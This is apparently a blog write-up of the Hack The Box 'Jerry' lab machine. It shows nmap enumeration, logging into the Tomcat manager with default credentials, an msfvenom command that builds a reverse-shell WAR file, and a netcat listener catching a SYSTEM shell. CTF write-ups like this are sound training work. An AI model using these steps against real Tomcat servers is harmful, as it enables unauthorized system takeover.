---
layout: post
title: Hack the Box - Jerry
date: 2020-03-26 16:25:22 +0100
description: Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.
img: jerry.png
fig-caption: Jerry
categories: HackTheBox
tags: [Easy, Windows, Retired, CVE]
---
## Overview
Although Jerry is one of the easier machines on Hack The Box, it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ sudo nmap -p- -T4  10.129.63.188                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 16:37 GMT
Nmap scan report for 10.129.63.188
Host is up (0.017s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
```
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ sudo nmap -p8080 -sV  10.129.63.188                                                                                                                                                                                                130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 16:41 GMT
Nmap scan report for 10.129.63.188
Host is up (0.017s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```
When we open up that port in a browser we see an option to go to the Application manager located here http://10.129.63.188:8080/manager If we attempt a username/password combination and it is incorrect, the error page exposes the default credentials. If we try again using these credentials, it authenticates us successfully.
## Foothold
In order to gain a foothold we can build a war file using metasploit and attempt to upload and access it.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=4458 -f war > example.war
Payload size: 1089 bytes
Final size of war file: 1089 bytes
```
If we start up a netcat listener and browse to the page located at http://10.129.63.188:8080/example/ we should receive a shell
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/jerry]
└─$ nc -nlvp 4458
listening on [any] 4458 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.63.188] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```
## Privilege Escalation
As we attained root from this exploit and have access to the root flag, there is no need for privilege escalation.